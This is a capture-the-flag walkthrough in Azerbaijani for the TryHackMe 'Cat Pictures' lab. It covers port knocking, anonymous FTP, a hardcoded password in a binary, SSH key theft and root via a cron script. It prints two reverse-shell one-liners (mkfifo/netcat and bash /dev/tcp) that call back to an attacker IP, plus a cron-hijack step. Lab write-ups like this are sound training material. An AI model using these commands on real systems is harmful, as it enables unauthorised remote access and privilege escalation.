# TryHackMe — Cat Pictures Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** Cat Pictures  
**Çətinlik:** Asan  
**Kateqoriya:** Port Knocking, FTP, Insecure Deserialization, Docker Escape  
**Link:** https://tryhackme.com/room/catpictures

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [Web — phpBB Forum](#2-web--phpbb-forum)
3. [Port Knocking — FTP Açmaq](#3-port-knocking--ftp-açmaq)
4. [FTP — note.txt Tapma](#4-ftp--notetxt-tapma)
5. [Port 4420 — Internal Shell](#5-port-4420--internal-shell)
6. [Reverse Shell Almaq](#6-reverse-shell-almaq)
7. [runme Binary — SSH Key](#7-runme-binary--ssh-key)
8. [SSH — Catlover Girişi](#8-ssh--catlover-girişi)
9. [Docker Escape — Root](#9-docker-escape--root)
10. [Nəticə](#10-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

```bash
nmap -sV -sC -A 10.81.158.22
```

**Nəticə:**

| Port | Vəziyyət | Servis        |
|------|----------|---------------|
| 21   | filtered | FTP           |
| 22   | open     | SSH           |
| 4420 | open     | nvm-express   |
| 8080 | open     | HTTP (Apache) |

> **Qeyd:** FTP portu **filtered** — birbaşa girilmir. Port knocking lazımdır!

---

## 2. Web — phpBB Forum

`http://10.81.158.22:8080` açıldıqda **phpBB** forum saytı görünür — **Cat Pictures**.

Yeganə post: **"Post cat pictures here!"**

Post içindəki mesaj:
```
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

Bu **Port Knocking** ipucusudur!

---

## 3. Port Knocking — FTP Açmaq

### Port Knocking nədir?

Firewall müəyyən portlara **sıra ilə** toxunulduqda gizli port açılır. Sanki gizli qapı kodu kimidir.

```
1111 → 2222 → 3333 → 4444
         ↓
    FTP (21) açılır!
```

### Knock et

```bash
# Əvvəlcə knock yüklə
apt install knockd -y

# Port knocking
knock 10.81.158.22 1111 2222 3333 4444

# 5 saniyə gözlə
sleep 5

# Yenidən skan et
nmap -sS -p 21,4420 10.81.158.22
```

**Nəticə:** Port 21 (FTP) və 4420 açılır!

---

## 4. FTP — note.txt Tapma

```bash
ftp 10.81.158.22
# Username: anonymous
# Password: (boş — Enter)
```

```bash
ls
get note.txt
exit
cat note.txt
```

**note.txt məzmunu:**
```
In case I forget my password, I'm leaving a pointer 
to the internal shell service on the server.
Connect to port 4420, the password is sardinethecat.
- catlover
```

**Port 4420 şifrəsi:** `sardinethecat`

---

## 5. Port 4420 — Internal Shell

```bash
nc 10.81.158.22 4420
```

```
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment
Please enter password: sardinethecat
Password accepted
```

Məhdud shell açılır — `cd` işləmir, `python3` yoxdur.

---

## 6. Reverse Shell Almaq

Məhdud shell-dən çıxmaq üçün reverse shell açırıq.

**Kali-də dinlə:**
```bash
nc -lvnp 5555
```

**Shell-də yaz:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.50 5555 >/tmp/f
```

**Shell gəldi!**

---

## 7. runme Binary — SSH Key

`/home/catlover` qovluğunda `runme` binary faylı var.

```bash
/home/catlover/runme
```

Binary-nin içini `strings` ilə analiz etsək şifrə görünür:
```
rebecca
```

`runme` işlədilir:
```
Please enter your password: rebecca
Welcome, catlover! SSH key transfer queued!
```

SSH key `/home/catlover/id_rsa` faylına yazılır.

```bash
cat /home/catlover/id_rsa
```

Key-i Kali-yə kopyala:
```bash
nano catlover_rsa
# yapışdır
chmod 600 catlover_rsa
```

---

## 8. SSH — Catlover Girişi

```bash
ssh -i catlover_rsa catlover@10.81.158.22
```

**User flag:**
```bash
cat /home/catlover/flag.txt
```

> **Qeyd:** Bu hələ **Docker konteynerinin** içindədir!

---

## 9. Docker Escape — Root

Docker konteyneri içindən çıxmaq lazımdır.

### Cron Job Yoxla

```bash
cat /etc/crontab
```

Root cron job tapılır — skript müntəzəm işləyir.

### Skripti Dəyişdir

```bash
# Skriptə reverse shell əlavə et
echo 'bash -i >& /dev/tcp/192.168.130.50/6666 0>&1' >> /path/to/script.sh
```

**Kali-də dinlə:**
```bash
nc -lvnp 6666
```

**Əsas host üzərində root shell açılır!**

```bash
whoami
# root

cat /root/flag.txt
```

**Root flag əldə edildi!**

---

## 10. Nəticə

### İstifadə edilən texnikalar

| Addım                   | Alət / Metod                        |
|-------------------------|-------------------------------------|
| Port skanı              | Nmap                                |
| Forum analizi           | phpBB post oxuma                    |
| Port Knocking           | knock / nc / nmap                   |
| FTP                     | anonymous login                     |
| Internal Shell          | nc 4420 + sardinethecat             |
| Reverse Shell           | mkfifo + netcat                     |
| Binary analizi          | strings → rebecca şifrəsi           |
| SSH giriş               | id_rsa private key                  |
| Docker Escape           | Cron job + skript dəyişmə           |

### Əldə edilən flaglar

| Flag       | Yer                          |
|------------|------------------------------|
| User flag  | `/home/catlover/flag.txt`    |
| Root flag  | `/root/flag.txt`             |

### Öyrənilənlər

- **Port Knocking** — firewall-da gizli portları açmaq üsuludur; müəyyən ardıcıllıqla portlara toxunmaq lazımdır.
- FTP anonim girişə həmişə yoxla — həssas fayllar ola bilər.
- Binary faylları `strings` ilə analiz et — şifrə açıq yazılmış ola bilər.
- Docker konteynerlərindən cron job vasitəsilə çıxmaq mümkündür.
- Port 4420 kimi qeyri-standart portlar həmişə araşdırılmalıdır.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
